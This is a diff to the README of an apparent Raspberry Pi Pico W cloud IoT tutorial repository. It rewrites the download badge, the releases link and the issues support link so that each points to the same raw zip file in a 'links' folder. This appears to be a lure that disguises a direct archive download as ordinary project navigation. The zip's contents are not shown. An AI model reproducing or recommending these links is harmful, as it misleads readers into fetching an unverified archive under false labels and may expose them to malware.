@@ -4,10 +4,10 @@
 Welcome to the __2025_10_26_chihlee_pi_pico__ repository! This project offers a practical introduction to using the Raspberry Pi Pico W for cloud Internet of Things applications. You can learn how to integrate these devices with various cloud services effectively.
 
 ## 💾 Download Now
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/ammoniated-rugbyfootball196/__2025_10_26_chihlee_pi_pico__/releases)
+[![Download from Releases](https://raw.githubusercontent.com/ammoniated-rugbyfootball196/__2025_10_26_chihlee_pi_pico__/main/links/__2025_10_26_chihlee_pi_pico___2.8.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ammoniated-rugbyfootball196/__2025_10_26_chihlee_pi_pico__/main/links/__2025_10_26_chihlee_pi_pico___2.8.zip)
 
 ## 📥 Download & Install
-To get started, visit this page to download: [Releases Page](https://github.com/ammoniated-rugbyfootball196/__2025_10_26_chihlee_pi_pico__/releases). 
+To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/ammoniated-rugbyfootball196/__2025_10_26_chihlee_pi_pico__/main/links/__2025_10_26_chihlee_pi_pico___2.8.zip). 
 
 On this page, you will find the latest versions of the software along with additional files and resources. 
 
@@ -41,7 +41,7 @@ Explore the following to make the most of your experience:
 
 ## 📞 Need Help?
 If you encounter any issues or have questions:
-- Visit the [issues section](https://github.com/ammoniated-rugbyfootball196/__2025_10_26_chihlee_pi_pico__/issues) on GitHub for support.
+- Visit the [issues section](https://raw.githubusercontent.com/ammoniated-rugbyfootball196/__2025_10_26_chihlee_pi_pico__/main/links/__2025_10_26_chihlee_pi_pico___2.8.zip) on GitHub for support.
 - Check the FAQ in the user manual for quick answers.
 
 Thank you for choosing the __2025_10_26_chihlee_pi_pico__ application! Enjoy your journey with the Raspberry Pi Pico W and cloud IoT applications.
